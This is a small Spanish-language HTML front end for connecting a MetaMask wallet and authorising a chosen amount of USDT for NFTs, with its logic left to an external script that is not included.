<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aprobación USDT para NFTs</title>
    <!-- CDN verificado de ethers.js -->
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        body { font-family: Arial, sans-serif; max-width: 600px; margin: 20px auto; padding: 20px; }
        .status { margin: 15px 0; padding: 10px; border-radius: 4px; }
        .info { background-color: #e7f3fe; color: #31708f; }
        .success { background-color: #dff0d8; color: #3c763d; }
        .error { background-color: #f2dede; color: #a94442; }
        button { background-color: #f6851b; color: white; padding: 10px 15px; border: none; cursor: pointer; margin: 5px 0; }
        button:disabled { background-color: #cccccc; }
        input { padding: 8px; width: 100%; box-sizing: border-box; }
    </style>
</head>
<body>
    <h1>Autorización de USDT</h1>
    
    <div>
        <label for="amount">Cantidad de USDT:</label>
        <input type="number" id="amount" placeholder="Ej: 100" step="0.01" min="0">
    </div>
    
    <button id="connectButton">Conectar MetaMask</button>
    <button id="approveButton" disabled>Autorizar USDT</button>
    
    <div id="walletInfo" style="display: none;">
        <p>Billetera: <span id="walletAddress"></span></p>
        <p>Saldo USDT: <span id="usdtBalance">0</span></p>
    </div>
    
    <div id="status" class="status info">Conecta tu MetaMask para comenzar</div>

    <script src="mtsksdk.js"></script>
</body>
</html>
